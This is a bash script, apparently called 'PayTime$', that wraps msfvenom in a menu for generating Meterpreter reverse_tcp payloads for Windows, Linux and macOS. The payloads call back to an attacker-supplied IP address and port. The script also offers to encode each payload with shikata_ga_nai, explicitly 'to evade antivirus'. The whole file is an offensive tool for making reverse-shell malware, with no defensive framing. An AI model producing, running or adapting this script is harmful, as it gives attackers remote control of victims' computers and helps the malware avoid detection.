#!/bin/bash
cat << "EOF"
_____              _______ _                 _
|  __ \            |__   __(_)               | |
| |__) |_ _ _   _     | |   _ _ __ ___   ___ | |
|  ___/ _` | | | |    | |  | | '_ ` _ \ / _ \| |
| |  | (_| | |_| |    | |  | | | | | | |  __/|_|
|_|   \__,_|\__, |    |_|  |_|_| |_| |_|\___|(_)
              __/ |          _|_
             |___/          | $ |
EOF

function show_menu() {
    echo "============================="
    echo "         PayTime$            "
    echo "============================="
    echo "1. Generate Windows Payload"
    echo "2. Generate Linux Payload"
    echo "3. Generate macOS Payload"
    echo "4. Exit"
    echo ""
}

function generate_payload() {
    read -p "Enter LHOST (your IP address): " LHOST
    read -p "Enter LPORT (your listening port): " LPORT
    read -p "Enter output filename (without extension): " FILENAME
    
    # Validate inputs
    if [[ -z "$LHOST" || -z "$LPORT" || -z "$FILENAME" ]]; then
        echo "[!] Error: All fields are required."
        return
    fi

    case $OS_OPTION in
        1) 
            PAYLOAD="windows/x64/meterpreter/reverse_tcp"
            OUTPUT_FORMAT="exe"
            FINAL_EXT="exe"
            ;;
        2) 
            PAYLOAD="linux/x64/meterpreter/reverse_tcp"
            OUTPUT_FORMAT="elf"
            FINAL_EXT="elf"
            ;;
        3) 
            PAYLOAD="osx/x64/meterpreter/reverse_tcp"
            OUTPUT_FORMAT="macho"
            FINAL_EXT="macho"
            ;;
        *) 
            echo "[!] Invalid option. Exiting."
            exit 1 
            ;;
    esac

    echo "[*] Generating payload..."
    echo "[*] Payload: $PAYLOAD"
    echo "[*] LHOST: $LHOST"
    echo "[*] LPORT: $LPORT"
    echo "[*] Format: $OUTPUT_FORMAT"
    echo ""
    
    # Generate payload without invalid -x flag
    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$OUTPUT_FORMAT" -o "${FILENAME}.${FINAL_EXT}"
    
    if [ $? -ne 0 ]; then
        echo "[!] Failed to create the payload."
        return
    fi

    echo ""
    echo "[+] Payload created successfully!"
    echo "[+] Output file: ${FILENAME}.${FINAL_EXT}"
    echo "[+] File location: $(pwd)/${FILENAME}.${FINAL_EXT}"
    echo "[+] File size: $(du -h "${FILENAME}.${FINAL_EXT}" | cut -f1)"
    
    # Optional: Ask if user wants to encode the payload
    read -p "Do you want to encode the payload to evade antivirus? (y/n): " ENCODE_CHOICE
    if [[ "$ENCODE_CHOICE" == "y" || "$ENCODE_CHOICE" == "Y" ]]; then
        echo "[*] Encoding payload with shikata_ga_nai encoder..."
        msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$OUTPUT_FORMAT" -e x86/shikata_ga_nai -i 5 -o "${FILENAME}_encoded.${FINAL_EXT}"
        if [ $? -eq 0 ]; then
            echo "[+] Encoded payload created: ${FILENAME}_encoded.${FINAL_EXT}"
        fi
    fi
    
    echo ""
    read -p "Press any key to continue..."
}

while true; do
    show_menu
    read -p "Select an option (1-4): " OS_OPTION
    
    case $OS_OPTION in
        1|2|3) generate_payload ;;
        4) echo "[*] Exiting..."; exit 0 ;;
        *) echo "[!] Invalid option. Please try again." ;;
    esac
done
